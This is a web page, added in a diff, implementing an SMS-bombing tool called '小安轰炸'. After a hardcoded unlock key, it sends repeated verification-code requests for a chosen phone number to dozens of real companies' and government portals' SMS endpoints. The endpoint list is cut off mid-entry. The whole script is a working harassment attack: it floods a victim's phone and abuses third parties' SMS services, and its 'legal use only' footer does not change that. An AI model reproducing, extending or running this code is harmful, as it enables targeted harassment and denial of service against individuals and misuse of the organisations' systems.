@@ -1,0 +1,1608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>小安轰炸</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #0a0a2a, #1a1a40);
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        #fireworks-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background: rgba(20, 20, 40, 0.85);
+            border-radius: 15px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
+            margin-top: 40px;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(10px);
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(79, 195, 247, 0.3);
+        }
+        
+        h1 {
+            color: #4fc3f7;
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(79, 195, 247, 0.7);
+        }
+        
+        .subtitle {
+            color: #81d4fa;
+            font-size: 1.1rem;
+        }
+        
+        .auth-section {
+            padding: 20px;
+            background: rgba(30, 30, 60, 0.7);
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #81d4fa;
+            font-weight: bold;
+        }
+        
+        input[type="password"],
+        input[type="text"],
+        input[type="number"],
+        select {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #333;
+            border-radius: 8px;
+            background: rgba(25, 25, 50, 0.8);
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input[type="password"]:focus,
+        input[type="text"]:focus,
+        input[type="number"]:focus,
+        select:focus {
+            border-color: #4fc3f7;
+            outline: none;
+            box-shadow: 0 0 10px rgba(79, 195, 247, 0.5);
+        }
+        
+        button {
+            background: linear-gradient(to right, #1976d2, #1565c0);
+            color: white;
+            border: none;
+            padding: 15px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            width: 100%;
+            transition: all 0.3s;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:hover {
+            background: linear-gradient(to right, #1565c0, #0d47a1);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn-stop {
+            background: linear-gradient(to right, #e74c3c, #c0392b);
+        }
+        
+        .btn-stop:hover {
+            background: linear-gradient(to right, #c0392b, #a93226);
+        }
+        
+        .main-section {
+            display: none;
+            padding: 20px;
+            background: rgba(30, 30, 60, 0.7);
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .control-section {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .status {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 8px;
+            background: rgba(40, 40, 80, 0.8);
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        
+        .status div {
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+        }
+        
+        .success {
+            background: rgba(46, 204, 113, 0.2);
+            border-left: 4px solid #2ecc71;
+            color: #a8e6cf;
+        }
+        
+        .error {
+            background: rgba(231, 76, 60, 0.2);
+            border-left: 4px solid #e74c3c;
+            color: #ffaaa5;
+        }
+        
+        .info {
+            background: rgba(52, 152, 219, 0.2);
+            border-left: 4px solid #3498db;
+            color: #a1cae2;
+        }
+        
+        .warning {
+            background: rgba(241, 196, 15, 0.2);
+            border-left: 4px solid #f1c40f;
+            color: #fdfd96;
+        }
+        
+        .api-count {
+            text-align: center;
+            margin-top: 15px;
+            color: #81d4fa;
+            font-size: 0.9rem;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(40, 40, 80, 0.6);
+            border-radius: 8px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #4fc3f7;
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: #81d4fa;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #81d4fa;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px;
+                padding: 15px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .control-section {
+                grid-template-columns: 1fr;
+            }
+            
+            input[type="password"],
+            input[type="text"],
+            input[type="number"],
+            select {
+                padding: 12px;
+            }
+            
+            button {
+                padding: 12px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="fireworks-canvas"></canvas>
+    
+    <div class="container">
+        <header>
+            <h1>小安轰炸💣</h1>
+            <p class="subtitle">安全验证与短信发送系统</p>
+        </header>
+        
+        <div class="auth-section">
+            <div class="form-group">
+                <label for="key">请输入卡密解锁功能:</label>
+                <input type="password" id="key" placeholder="输入卡密">
+            </div>
+            <button id="unlockBtn">解锁工具</button>
+        </div>
+        
+        <div class="main-section" id="mainSection">
+            <div class="form-group">
+                <label for="phone">目标手机号码:</label>
+                <input type="text" id="phone" placeholder="请输入11位手机号码">
+            </div>
+            
+            <div class="control-section">
+                <div class="form-group">
+                    <label for="sendMode">发送模式:</label>
+                    <select id="sendMode">
+                        <option value="count">按发送条数</option>
+                        <option value="time">按发送时间</option>
+                    </select>
+                </div>
+                
+                <div class="form-group" id="countControl">
+                    <label for="sendCount">发送条数:</label>
+                    <input type="number" id="sendCount" min="1" max="1000" value="10">
+                </div>
+                
+                <div class="form-group" id="timeControl" style="display:none">
+                    <label for="sendTime">发送时间(秒):</label>
+                    <input type="number" id="sendTime" min="1" max="3600" value="60">
+                </div>
+            </div>
+            
+            <button id="sendBtn">开始发送验证码</button>
+            <button id="stopBtn" class="btn-stop" style="display:none; margin-top:10px;">停止发送</button>
+            
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="sentCount">0</div>
+                    <div class="stat-label">已发送</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="successCount">0</div>
+                    <div class="stat-label">成功</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="errorCount">0</div>
+                    <div class="stat-label">失败</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="remainingTime">--</div>
+                    <div class="stat-label">剩余时间</div>
+                </div>
+            </div>
+            
+            <div class="status" id="status">
+                <div class="info">等待操作...功能解锁后即可使用</div>
+            </div>
+            
+            <div class="api-count">系统集成 <strong>106</strong> 个API接口</div>
+        </div>
+        
+        <footer>
+            <p>© 2023 短信验证码工具 | 仅供合法用途</p>
+        </footer>
+    </div>
+
+    <script>
+        // 烟花背景效果
+        document.addEventListener('DOMContentLoaded', function() {
+            const canvas = document.getElementById('fireworks-canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            let fireworks = [];
+            let particles = [];
+            
+            class Firework {
+                constructor() {
+                    this.x = Math.random() * canvas.width;
+                    this.y = canvas.height;
+                    this.targetY = Math.random() * canvas.height * 0.6;
+                    this.speed = 2 + Math.random() * 2;
+                    this.color = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                    this.radius = 2;
+                    this.reached = false;
+                }
+                
+                update() {
+                    if (!this.reached) {
+                        this.y -= this.speed;
+                        if (this.y <= this.targetY) {
+                            this.reached = true;
+                            this.explode();
+                        }
+                    }
+                }
+                
+                explode() {
+                    for (let i = 0; i < 80; i++) {
+                        const particle = new Particle(this.x, this.y, this.color);
+                        particles.push(particle);
+                    }
+                }
+                
+                draw() {
+                    if (!this.reached) {
+                        ctx.beginPath();
+                        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                        ctx.fillStyle = this.color;
+                        ctx.fill();
+                    }
+                }
+            }
+            
+            class Particle {
+                constructor(x, y, color) {
+                    this.x = x;
+                    this.y = y;
+                    this.color = color;
+                    this.angle = Math.random() * Math.PI * 2;
+                    this.speed = Math.random() * 5 + 1;
+                    this.friction = 0.95;
+                    this.gravity = 0.2;
+                    this.alpha = 1;
+                    this.radius = Math.random() * 2 + 1;
+                }
+                
+                update() {
+                    this.speed *= this.friction;
+                    this.x += Math.cos(this.angle) * this.speed;
+                    this.y += Math.sin(this.angle) * this.speed + this.gravity;
+                    this.alpha -= 0.01;
+                }
+                
+                draw() {
+                    ctx.globalAlpha = this.alpha;
+                    ctx.beginPath();
+                    ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = this.color;
+                    ctx.fill();
+                    ctx.globalAlpha = 1;
+                }
+            }
+            
+            function animate() {
+                requestAnimationFrame(animate);
+                ctx.fillStyle = 'rgba(10, 10, 30, 0.2)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                if (Math.random() < 0.03) {
+                    fireworks.push(new Firework());
+                }
+                
+                for (let i = 0; i < fireworks.length; i++) {
+                    fireworks[i].update();
+                    fireworks[i].draw();
+                    
+                    if (fireworks[i].reached && fireworks[i].y > canvas.height) {
+                        fireworks.splice(i, 1);
+                    }
+                }
+                
+                for (let i = 0; i < particles.length; i++) {
+                    particles[i].update();
+                    particles[i].draw();
+                    
+                    if (particles[i].alpha <= 0) {
+                        particles.splice(i, 1);
+                    }
+                }
+            }
+            
+            animate();
+            
+            window.addEventListener('resize', function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+            
+            // 卡密验证
+            document.getElementById('unlockBtn').addEventListener('click', checkKey);
+            document.getElementById('key').addEventListener('keyup', function(e) {
+                if (e.key === 'Enter') checkKey();
+            });
+            
+            // 发送模式切换
+            document.getElementById('sendMode').addEventListener('change', function() {
+                if (this.value === 'count') {
+                    document.getElementById('countControl').style.display = 'block';
+                    document.getElementById('timeControl').style.display = 'none';
+                } else {
+                    document.getElementById('countControl').style.display = 'none';
+                    document.getElementById('timeControl').style.display = 'block';
+                }
+            });
+            
+            // 发送验证码
+            document.getElementById('sendBtn').addEventListener('click', startSending);
+            document.getElementById('stopBtn').addEventListener('click', stopSending);
+        });
+        
+        // 全局变量
+        let isSending = false;
+        let sendingInterval = null;
+        let remainingTime = 0;
+        let sentCount = 0;
+        let successCount = 0;
+        let errorCount = 0;
+        
+        // 检查卡密
+        function checkKey() {
+            const key = document.getElementById('key').value;
+            if (key === 'xiaoan2025nb') {
+                document.getElementById('mainSection').style.display = 'block';
+                addStatusMessage('验证成功，功能已解锁', 'success');
+            } else {
+                addStatusMessage('卡密错误，请重新输入', 'error');
+            }
+        }
+        
+        // 添加状态消息
+        function addStatusMessage(message, type) {
+            const statusDiv = document.getElementById('status');
+            const messageDiv = document.createElement('div');
+            messageDiv.className = type;
+            messageDiv.textContent = message;
+            statusDiv.insertBefore(messageDiv, statusDiv.firstChild);
+            
+            // 限制消息数量
+            if (statusDiv.children.length > 50) {
+                statusDiv.removeChild(statusDiv.lastChild);
+            }
+        }
+        
+        // 开始发送
+        function startSending() {
+            const phone = document.getElementById('phone').value;
+            if (!phone || !/^1[3-9]\d{9}$/.test(phone)) {
+                addStatusMessage('请输入有效的手机号码', 'error');
+                return;
+            }
+            
+            const sendMode = document.getElementById('sendMode').value;
+            if (sendMode === 'count') {
+                const sendCount = parseInt(document.getElementById('sendCount').value);
+                if (isNaN(sendCount) || sendCount < 1) {
+                    addStatusMessage('请输入有效的发送条数', 'error');
+                    return;
+                }
+                startCountSending(phone, sendCount);
+            } else {
+                const sendTime = parseInt(document.getElementById('sendTime').value);
+                if (isNaN(sendTime) || sendTime < 1) {
+                    addStatusMessage('请输入有效的发送时间', 'error');
+                    return;
+                }
+                startTimeSending(phone, sendTime);
+            }
+        }
+        
+        // 按条数发送
+        function startCountSending(phone, totalCount) {
+            if (isSending) return;
+            
+            isSending = true;
+            sentCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            
+            document.getElementById('sendBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('sentCount').textContent = '0';
+            document.getElementById('successCount').textContent = '0';
+            document.getElementById('errorCount').textContent = '0';
+            document.getElementById('remainingTime').textContent = '--';
+            
+            addStatusMessage(`开始向 ${phone} 发送 ${totalCount} 条验证码...`, 'info');
+            
+            // 开始发送
+            sendingInterval = setInterval(() => {
+                if (sentCount >= totalCount) {
+                    stopSending();
+                    addStatusMessage(`已完成 ${totalCount} 条短信发送`, 'success');
+                    return;
+                }
+                
+                sendAllRequests(phone);
+                sentCount++;
+                document.getElementById('sentCount').textContent = sentCount;
+            }, 1000);
+        }
+        
+        // 按时间发送
+        function startTimeSending(phone, totalTime) {
+            if (isSending) return;
+            
+            isSending = true;
+            sentCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            remainingTime = totalTime;
+            
+            document.getElementById('sendBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'block';
+            document.getElementById('sentCount').textContent = '0';
+            document.getElementById('successCount').textContent = '0';
+            document.getElementById('errorCount').textContent = '0';
+            document.getElementById('remainingTime').textContent = remainingTime;
+            
+            addStatusMessage(`开始向 ${phone} 发送验证码，持续 ${totalTime} 秒...`, 'info');
+            
+            // 开始发送
+            sendingInterval = setInterval(() => {
+                if (remainingTime <= 0) {
+                    stopSending();
+                    addStatusMessage(`已完成 ${totalTime} 秒的短信发送`, 'success');
+                    return;
+                }
+                
+                sendAllRequests(phone);
+                sentCount++;
+                remainingTime--;
+                
+                document.getElementById('sentCount').textContent = sentCount;
+                document.getElementById('remainingTime').textContent = remainingTime;
+            }, 1000);
+        }
+        
+        // 停止发送
+        function stopSending() {
+            if (sendingInterval) {
+                clearInterval(sendingInterval);
+                sendingInterval = null;
+            }
+            
+            isSending = false;
+            document.getElementById('sendBtn').style.display = 'block';
+            document.getElementById('stopBtn').style.display = 'none';
+            
+            addStatusMessage('发送已停止', 'info');
+        }
+        
+        // 发送所有请求
+        async function sendAllRequests(phone) {
+            // 定义所有API接口 - 已更新为106个API
+            const apis = [
+                {
+                    url: 'https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Host': 'mobilev2.atomychina.com.cn'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone,
+                        captcha: "1111",
+                        token: "1111",
+                        prefix: 86
+                    })
+                },
+                {
+                    url: 'https://apibus.zhihuiyunxing.com/api/v1/common/captcha/send/sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://gateway-front-external.nio.com/onvo/moat/1100023/n/a/user/access/verification_code?hash_type=sha256',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: `country_code=86&mobile=${phone}&classifier=login`
+                },
+                {
+                    url: 'https://api666.xfb315.cn/auth/send_sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone: phone
+                    })
+                },
+                {
+                    url: 'https://muguntools.com/api/sms/send',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phone: phone
+                    })
+                },
+                {
+                    url: 'https://passport.uucin.com/accounts/send_login_mobile_captcha',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.sohochinaoffice.com/api/mini-login/send-verify-code',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://rt.taihulidian.com/appapi/?r=user/verify-code&appid=wxbdc2473d8e16d081&phone=${phone}&token=&v=4.1.20250102`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://api.zxw.xinchengzxw.com/sms/send_code',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://prod.driver.yunzhukj.cn/terminal/api/basics/sendMobileCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.wfjec.com/mall/user/sendRegisterSms',
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://shopapi.cadf.top/user-center/frontend/user/login/getVerifyCode?mobile=${phone}&smsType=phoneLogin&parentId=&client=miniapp&sid=1857383252235206657`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://epassport.diditaxi.com.cn/passport/login/v5/codeMT',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.ky-express.com/router/rest?web.login.verification.sendSmsCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.deppon.com/ndcc-gwapi/messageService/eco/message/sendSmsMessage',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://cl-gateway.tuhu.cn/cl-user-auth-login/login/getVerifyCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://12345lm.www.yn.gov.cn:9001/WebPortal/Api/BanJian/SendValidateSmsCodeForWeChat',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.hengdianfilm.com/common/send_mb_code',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://jkzn.zdjk.tv/api/medical-login/login/send/sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://hmb.webao99.com/newbeijing/api/prologue/user/acquireCaptcha',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://centerapi.qschou.com/passport/common/sms/send',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://weixin.ngarihealth.com/weixin/wx/mp/wx870abf50c6bc6da3/gateway',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://m.120.net/free/new_send',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://wx2270.cnhis.cc/wx/send/code/login.htm',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://data.mijiaoyu.cn/assist2/corFilter/sysMessage?mobile=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://mpc-user.airdoc.com/api/user/verify',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://m.shhzcj.com/cors-api/v1/sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://csswechat.jomoo.cn/index.php?g=Datement&m=Index&a=sendcode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://zxh.fesco.com.cn/api/user/GetVerFicationCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://app-services.lynkco.com.cn/auth/mp/uc/send-Sms?mobile=${phone}&appId=wx4e8c1172fe132106`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://www.zara.cn/itxrest/1/user/store/11716/verify/send-code?languageId=-7',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://biz.xilaigong.com/api/auth/sendCode/${phone}`,
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://passport.csdn.net/v1/login/sendVerifyCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://app.zwfw.nmg.gov.cn/webrest/rest/nmcheckcode/getCheckCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://12345.sp.nanning.gov.cn/api/consulting/users/send_rand',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://yqcx.hk12345.cn/hksztel/wxapi/weixin/doMessage',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'http://www.hf12345.vip/wx/sms/sendValidateSms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.dzmyy.com.cn/Applet/Main/MobileVerification',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://gateway.swifthealth.cn/patient/v1/usercenter/unauth/pat-verificationcode?mobile=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://niuzhigongzuo.com/weapp/sms/sendCode2',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.gsyzkj.cn/index.php?s=/addon/DuoguanUser/CardApi/sendPhoneVerifyCode.html',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://kh.yto.net.cn/steward/weixin/login/getGraphicsInfo',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://ga.sczwfw.gov.cn/app/api/security/smscode/get',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://pzh12345.cn/cns-bmfw-webrest/rest/cnssmssend/getSmsVerify',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://yf12345.yunfu.gov.cn/workorderApp/wx/auth/sendVerificationCode.json?mobile=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://agent.12345.yanan.gov.cn:8000/app/api/v1/orderCitizen/send_captcha',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://api.yundaili.com/wx/getCode?mobile=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'http://www.zhrcpq.com/H5/gshrserver.asmx/SqCheckSendSms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.qhxdrcw.com/wap//index.php?c=ajax&a=regcode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://user.zjzwfw.gov.cn/nuc/login/sendSmsCodeForMobile',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://miniprogram.hebei.com.cn/prod-api/auth/api/sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://carlife.ygbx.com/suncar-member/sms/getPhoneMsg/getPhoneMsgVerificationCodeToh5',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://a.welife001.com/applet/sendVerifyCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://mp.weixiao100.com.cn/wxapp/common/linkman/smsCode?version=1.4.1',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://order-api.vivatraveler.com/v1/getSmsCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.jimuzhou.top/sendCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: `https://m.doctorpanda.com/panda-h5-web/miniapps/users/sendCode?_t=1718120484723&mobile=${phone}`,
+                    method: 'GET',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                },
+                {
+                    url: 'https://api.xiaoantech.com/xcuser/v1/user/requestSmsCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://axq.beidouxh.cn/user-api/getPhoneCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://www.8341.top/sys/tabUser/sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://zcclient.uqbike.com/customer/login/sms',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://client3.uqbike.cn/sms/sendAuthCode.do',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
+                    url: 'https://api.taxi.lehuicloud.cn/app/verifyCode/sendVerifyCode',
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        mobile: phone
+                    })
+                },
+                {
